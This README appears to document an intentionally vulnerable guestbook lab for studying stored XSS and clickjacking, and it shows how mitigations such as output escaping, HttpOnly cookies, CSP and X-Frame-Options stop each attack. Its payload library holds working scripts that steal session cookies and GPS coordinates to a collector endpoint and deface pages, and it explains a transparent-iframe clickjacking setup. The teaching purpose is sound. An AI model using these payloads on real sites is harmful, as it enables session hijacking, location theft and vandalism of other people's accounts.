# Stored XSS / Clickjacking Testing Lab

🇯🇵 **[日本語で読む](README.md)** | 🌐 English (this page)

> **Authorized Testing & Education Only**

A hands-on learning tool built around an intentionally vulnerable bulletin-board (guestbook) application. It lets you reproduce and observe two classic web attacks in a local lab environment, and toggle each defense ON/OFF in real time to see exactly how the outcome changes.

- **① Stored XSS (Stored Cross-Site Scripting)** — submitted content is saved and rendered without escaping
- **② Clickjacking (CJ)** — a transparent iframe is layered over a decoy page to hijack clicks

Beyond just reproducing the attacks, **the heart of this tool is the defense-verification side**: turn on each mitigation and watch exactly how the attack starts to fail.

---

## ⚠️ Warning

- Only run this in a **local/lab environment that you own or control**, or one for which you have **written authorization** to test.
- Using these techniques against third-party sites or systems without authorization is **illegal** in most jurisdictions (e.g. unauthorized access / computer misuse laws).
- This application is **intentionally vulnerable**. **Never run it on an untrusted or shared network** — by default it binds to `0.0.0.0:5000`, which exposes it to your whole LAN.
- This app is for learning and testing only. It implements **none** of the hardening you'd expect in production: no robust authentication, no CSRF protection, no persistent database, etc.
- **Never** expose this to the public internet, including through a reverse proxy, tunnel, or port-forwarding.

## Setup and Running

### 1. Install dependencies

The startup code in `app.py` serves **HTTPS via gevent's WSGIServer**. The required dependencies (Flask, gevent, cryptography) are listed in `requirements.txt`. `cryptography` is used by `pemcreator.py` (the certificate generator) in the next step.

```bash
cd stored-xss-cj-poc
python3 -m venv venv && source venv/bin/activate   # optional (Windows: venv\Scripts\activate)
pip install -r requirements.txt
```

Contents of `requirements.txt`:

```
Flask>=3.0
gevent>=24.0
cryptography>=42.0
```

> **pip vs. Python (a common point of confusion)**
> - pip **cannot install Python itself** — it's a package manager that ships with Python.
> - Flask, gevent, and cryptography, on the other hand, **can** be installed with pip.

### 2. Generate a certificate (pemcreator.py)

After installing dependencies, **generate the HTTPS certificate**. `app.py` loads `cert.pem` / `key.pem` from the current directory at startup, so they must exist before you run it.

The bundled `pemcreator.py` **auto-detects the machine's current local IP address** and issues a certificate that covers that IP (plus `localhost` / `127.0.0.1`). This lets another device on the LAN (playing the victim) reach `https://<host machine's IP>:5000/` without a hostname mismatch.

```bash
python pemcreator.py
```

Running it prints the detected IP and writes `cert.pem` and `key.pem` to the current directory.

```
Detected local IP: 192.168.xx.xx
Done! Generated cert.pem and key.pem.
```

> **⚠ Re-issue the certificate if your IP changes**
> If the host machine's IP address changes (switching Wi-Fi networks, rebooting the router, moving to a different network, etc.), the existing certificate still references the old IP, which causes warnings or mismatches when accessed over the LAN. When that happens, **delete `cert.pem` and `key.pem` and re-run `pemcreator.py`** to issue a certificate for the new IP.
>
> ```bash
> rm cert.pem key.pem          # Windows: del cert.pem key.pem
> python pemcreator.py
> ```

### 3. Run it

```bash
python app.py
```

On a successful start you'll see this banner in the console:

```
========================================================================
Stored XSS PoC Demo -- Authorized Testing & Education Only
Do not expose this to the internet.
========================================================================
HTTPS started: https://127.0.0.1:5000
```

It listens over **HTTPS on `0.0.0.0:5000` (all interfaces)** using the `cert.pem` / `key.pem` generated by `pemcreator.py`. You'll see a browser warning because it's a self-signed certificate. Access it at:

- `https://127.0.0.1:5000/` (from the host machine itself — redirects to `/login` automatically)
- `https://<host machine's LAN IP>:5000/` (from another device on the same LAN, playing the victim)

> The certificate is issued by `pemcreator.py` to match the host machine's IP (for localhost / 127.0.0.1 / the machine's IP). **If the IP changes**, delete `cert.pem` / `key.pem` and re-run `pemcreator.py` (see [2. Generate a certificate](#2-generate-a-certificate-pemcreatorpy)).
>
> **To stop it**: `Ctrl+C` in the console. To leave the virtual environment: `deactivate`.

### 4. Detailed Windows setup

1. **Open Command Prompt "as Administrator"** — Windows key → type "cmd" → right-click → "Run as administrator".
2. **Move into the project folder**: `cd /d C:\Users\<username>\Downloads\stored-xss-cj-poc`
3. **Check Python**: `python --version` (3.8 or newer is fine)
4. **(If not installed) Install Python**: `winget install -e --id Python.Python.3.13`. Afterward, reopen the command prompt and confirm "Add python.exe to PATH" was checked during install.
5. **(Optional) Virtual environment**: `python -m venv venv` → `venv\Scripts\activate`
6. **Install dependencies**: `pip install -r requirements.txt`
7. **Generate the certificate**: `python pemcreator.py` (generates `cert.pem` / `key.pem` for the machine's current IP; if the IP changes, `del cert.pem key.pem` and re-run)
8. **Run it**: `python app.py`

### Why HTTPS?

Of the Stored XSS impacts demonstrated here, **geolocation theft (the Geolocation API) only works in a secure context (HTTPS or localhost)**. This app serves HTTPS so that GPS theft can be demonstrated against a victim on another LAN device, not just `localhost`.

### Restricting it to localhost only

If you only want to test on a single machine, switch the last line of `app.py` to:

```python
# To stop serving HTTPS/LAN and restrict to localhost only:
app.run(host="127.0.0.1", port=5000, debug=True)
```

Note: in this mode the GPS-theft demo only works when the victim is also on `localhost`; it won't work for a victim reached over the LAN.

## Scenario 1: Stored XSS

### Where the vulnerability lives

- **Output (board.html)**: post bodies are rendered as `{{ m.body|safe }}`, which disables Jinja2's automatic escaping. Any `<script>` in a post is parsed and executed by the browser.
- **Cookie (login / guest_login in app.py)**: the session cookie is set without `HttpOnly`, so it can be read from JavaScript via `document.cookie`.

### Walkthrough

1. **Log in as the attacker**: in Browser A, open `https://127.0.0.1:5000/login`, log in as `user / User@2024`, and you'll land on `/board`.
2. **Log in as the victim**: in Browser B (a different browser or incognito window), open the same URL and log in as `admin / Admin@2024`, landing on `/board`.
   - ✅ At this point A and B hold separate session cookies. You can confirm this from the "logged in as" indicator at the top of the board.
3. **Open the attacker dashboard**: in the attacker's browser, open `https://127.0.0.1:5000/attacker-dashboard` directly in a separate tab.
4. **Post the attack payload (Browser A)**: first confirm the app is vulnerable by posting the sanity-check payload (9-1) and seeing `alert(1)` fire. After clicking Reset, post the **combined payload (9-6)**.
5. **The victim views the page (Browser B)**: reload the board — the payload executes the moment the page renders.
   - If you **allow** the GPS permission prompt, coordinates are captured too (cookie and IP are still sent even if you deny it).
   - Right after, the page is defaced into "⚠ This site has been hacked ⚠".
   - ✅ The victim is compromised **just by viewing the board** — this is what makes stored XSS such a dangerous, passive attack.
6. **Check the captured data**: reload the attacker dashboard and confirm the cookie (`session=adm_...`), IP, user agent, GPS coordinates, and capture timestamp were recorded.

🎯 **Goal**: understand that the captured `adm_` token could be swapped into the attacker's own session cookie to impersonate the administrator (session hijacking).

### The four real-world impacts of stored XSS demonstrated here

| # | Impact | Mechanism |
|---|---|---|
| 1 | Session cookie theft (session hijacking) | `document.cookie` sent to the attacker's server (`/collector`) |
| 2 | Logging the victim's IP | Captured from the `/collector` access log (`request.remote_addr`) |
| 3 | Geolocation theft | Geolocation API (requires HTTPS and user permission) |
| 4 | Page defacement | Overwrites `document.body.innerHTML` |

## Scenario 2: Clickjacking

A transparent iframe is layered over the victim site, so that clicking a decoy page's button actually **triggers the account-deletion button** underneath.

### Target

The "Delete account" button on `/profile` (and the nav-less `/profile/embed`). It submits `POST /profile/delete`, deleting the currently logged-in account.

### Walkthrough

1. In the victim's browser, log in to the target account (e.g. `user`).
2. As the attacker, **open "CJ Control Panel" from the top nav of the attacker dashboard**.
3. Use the sliders to adjust the iframe's **opacity, vertical (Y), and horizontal (X) position** so the invisible delete button lines up with the decoy's "Confirm my prize" button.
   - The "🔴 Stealth" preset reproduces what the victim sees (nearly invisible).
   - The "🟡 Semi-transparent" preset makes the iframe partly visible so you can check the alignment.
4. There are two ways to test it:
   - **Same browser**: click "⚔ Open attack stage" — a new window opens, and slider changes are reflected live via `postMessage`.
   - **Cross-browser**: click "📋 Copy URL" to get a victim URL with the X/Y/opacity baked in, then open it in the victim's separate browser.
5. The victim clicks "✔ Confirm my prize" — in reality, the delete button inside the transparent iframe is clicked, and the account is deleted.
6. Opening `/profile` now shows "this account has been deleted". Use `/reset` to restore it.

### How it works (attacker_cj_stage.html)

- **Layer 1 (decoy)**: a fake "you won a gift card" page. `pointer-events: none` so it never receives clicks — it's only there for visual alignment.
- **Layer 2 (iframe)**: `/profile/embed` layered on top with `opacity: 0.05` and `z-index: 2` — **this iframe is what actually receives the click**. `transform: translate(x, y)` positions the delete button directly under the decoy button.
- When the mitigation (`X-Frame-Options: DENY`) is enabled, the browser refuses to load the iframe and shows a "🛡 X-Frame-Options: DENY" overlay, neutralizing the attack.

## Defense Toggles and Verification Workflow

`/settings` (admin/staff only) lets you switch six mitigations individually ON/OFF; the state persists in `settings.json`. **Everything defaults to OFF (i.e., the vulnerable state)**. Toggles take effect **the instant you click them** — there's no separate "save" button.

### Each mitigation and when it takes effect

| Key | Mitigation | When ON | Takes effect |
|---|---|---|---|
| `escape` | Output escaping | `<script>` is rendered as plain text and never executes (**the root-cause fix**) | From the next post onward |
| `sanitize` | Input sanitization (strips HTML tags on save) | Tags are stripped at post time, so no script survives regardless of how it's later rendered | From the next post onward |
| `httponly` | HttpOnly cookie | `document.cookie` can't read it, so cookie theft returns nothing | Cookie is reissued immediately on toggle |
| `csp` | Content-Security-Policy (`script-src 'self'`) | The browser refuses to execute inline `<script>` at all (defense in depth) | Immediately on reload |
| `samesite_strict` | SameSite=Strict cookie | Cookie isn't sent on requests originating from other sites | Cookie is reissued immediately on toggle |
| `x_frame_options` | X-Frame-Options: DENY (+ nosniff) | Refuses iframe embedding, neutralizing clickjacking | Immediately on reload |

- CSP and X-Frame-Options are applied in `app.py`'s `@app.after_request` hook (`apply_security_headers`).
- HttpOnly and SameSite take effect at login/guest-login, and whenever the cookie is reissued after a toggle change.
- Sanitization applies when a post is saved; escaping applies when the board is rendered.

### Verification loop

Repeat this for each mitigation:

1. Click **Reset** in the nav to clear posts and captured data.
2. In **Defense Settings**, switch the mitigation you're testing **ON** (takes effect immediately on click).
3. As the attacker (Browser A), post the payload again — since escape/sanitize only apply "from the next post onward", re-posting after turning it ON makes the effect clear.
4. As the victim (Browser B), reload the board.
5. Open `/attacker-dashboard` and confirm that the theft failed / no damage occurred.
6. Once confirmed, switch that mitigation back **OFF** before moving to the next one (so each effect is isolated).

> **Suggested presentation order**
> 1. `escape` first (the root-cause fix) — watch the script become plain "text"
> 2. Then `httponly` — the script still runs, but the cookie can no longer be stolen
> 3. Finally `csp` — execution itself gets blocked, as defense in depth
>
> This lets you feel the layered-defense idea in practice: "①don't let it in at all → ②don't let it steal anything → ③don't let it execute."

## Bot Conversation Simulation

A feature that makes the board look like it's actually being used by people (controlled from the admin panel, `/admin`).

- Clicking "▶ Start bot conversation" spins up a background thread that randomly picks one of 7 Japanese conversation scripts and posts naturally, with **4–9 second intervals** between messages.
- Each bot "views" the board before posting. If **both escape and sanitize are OFF** and an XSS payload is present on the board, that bot is treated as "infected", and one entry of captured data (with fake GPS) is recorded in `loot.json` (once per bot).
- While the bot is running, the board auto-reloads every 3.5 seconds.
- The admin panel tags bots with a `[Bot]` label, but **they're indistinguishable from real users on the board itself**.
- Bot tokens are issued with the `usr_` prefix (role: user).
- The characters and content in the conversation scripts are entirely fictional and unrelated to any real person.

## Payload Library

> ⚠️ Paste these directly into the post form. **Only post them against this lab's board, in an environment you control.**

### 9-1. Sanity check

```html
<script>alert(1)</script>
```

### 9-2. Cookie theft

```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({cookie: document.cookie, url: location.href})
});
</script>
```

### 9-3. Logging the victim's IP

As soon as the `fetch('/collector', ...)` call above lands, the server side (`request.remote_addr`) automatically records the connecting IP. There's no standard client-side JS API to read the other party's public IP directly, so "read it off the attacker server's access log" is the common real-world technique too.

### 9-4. Geolocation theft (requires HTTPS + user permission)

```html
<script>
navigator.geolocation.getCurrentPosition(function(pos) {
  fetch('/collector', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      gps: {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}
    })
  });
}, function(err) {
  // Even if denied, still send cookie + IP
  fetch('/collector', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cookie: document.cookie, url: location.href})
  });
});
</script>
```

**Geolocation API constraints**

| Condition | Result |
|---|---|
| HTTPS (or localhost) + permission granted | High-accuracy latitude/longitude |
| HTTPS + permission denied | Error callback fires → only cookie + IP are sent |
| HTTP (other than localhost) | `getCurrentPosition` is never even called |
| Smartphone | High accuracy via GPS |
| PC (Wi-Fi) | Lower accuracy via IP-based geolocation etc. |

### 9-5. Page defacement

```html
<script>
document.title = 'HACKED';
document.body.innerHTML =
  '<h1 style="color:red;text-align:center;margin-top:20%">'
  + '⚠ This site has been hacked ⚠</h1>';
</script>
```

### 9-6. Combined payload (reproduces all four impacts at once — used for the main scenario)

A single payload that combines 9-2 through 9-5 (no new behavior, just combined).

```html
<script>
(function() {
  function sendToCollector(gps) {
    fetch('/collector', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({cookie: document.cookie, url: location.href, gps: gps || null})
    }).then(function() {
      // Deface the page after sending
      document.title = 'HACKED';
      document.body.innerHTML =
        '<h1 style="color:red;text-align:center;margin-top:20%">'
        + '⚠ This site has been hacked ⚠</h1>';
    });
  }
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendToCollector({lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy});
      },
      function() { sendToCollector(null); } // still send cookie + IP if denied
    );
  } else {
    sendToCollector(null);
  }
})();
</script>
```

## Where the Vulnerabilities Live

| Location | The problematic code | Explanation |
|---|---|---|
| `templates/board.html` | `{{ m.body\|safe }}` | Disables automatic escaping, so any `<script>` in a post executes as-is (switch to `{{ m.body }}` when `escape` is ON) |
| `login()` / `guest_login()` in `app.py` | `set_cookie(..., httponly=False)` | The session cookie lacks `HttpOnly`, so its token can be read via `document.cookie` (fixed when `httponly` is ON) |
| `templates/profile*.html` | No anti-framing header by default | iframe embedding is possible, enabling clickjacking (fixed when `x_frame_options` is ON) |
| `ACCOUNTS` in `app.py` | Passwords stored in plaintext | An intentional weakness for demo purposes |

## Summary of Mitigations

How these toggles map to real-world defenses:

- **Output escaping** (`escape`): let templates auto-escape instead of using `|safe`. If you need to allow rich text, whitelist tags/attributes with something like bleach or DOMPurify.
- **HttpOnly cookie** (`httponly`): prevents the session token from being read by JavaScript.
- **Content-Security-Policy** (`csp`): disallow inline script execution (e.g. `script-src 'self'`) as defense in depth, limiting damage even if an escaping gap exists.
- **SameSite / Secure attributes** (`samesite_strict`): use SameSite=Strict (or Lax), and pair with Secure in an HTTPS environment.
- **Input validation / sanitization** (`sanitize`): reject or strip unexpected input server-side.
- **X-Frame-Options / frame-ancestors** (`x_frame_options`): block iframe embedding with `X-Frame-Options: DENY` (or CSP's `frame-ancestors 'none'`) to prevent clickjacking.

## Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `ModuleNotFoundError: gevent` on startup | Dependencies not installed. Activate the virtual environment and run `pip install -r requirements.txt` |
| `ModuleNotFoundError: cryptography` when running `pemcreator.py` | Same as above |
| `cert.pem` / `key.pem` not found on startup | Certificate hasn't been generated yet. Run `python pemcreator.py` before starting the app |
| Browser shows a certificate warning | Expected — it's a self-signed certificate. Fine to proceed for lab purposes |
| Certificate hostname/IP mismatch over the LAN | The host machine's IP probably changed. Delete `cert.pem` / `key.pem` and re-run `python pemcreator.py` to reissue it for the current IP |
| `alert` doesn't fire / script doesn't execute | Check whether `escape` or `sanitize` is ON. If so, turn it OFF and **re-post** the payload (both only apply "from the next post onward") |
| Cookie isn't captured on the dashboard | If `httponly` is ON, `document.cookie` is empty — that's the mitigation working correctly |
| Nothing shows up on the dashboard | Check whether the victim's browser reloaded the board, and whether the post was actually made from the attacker's account |
| GPS coordinates aren't captured | Either permission was denied, accuracy is low on a PC, or the page is open over HTTP (and not localhost). Try again over HTTPS or localhost and allow the prompt |
| The clickjacking iframe doesn't load | Check whether `x_frame_options` is ON (if so, that's clickjacking being correctly blocked) |
| Attacker and victim end up with the same cookie | Both logged in from the same window of the same browser. Use a different browser or a private/incognito window |
| `pip install` fails | Check your Python version (3.8+) and whether the virtual environment is activated |
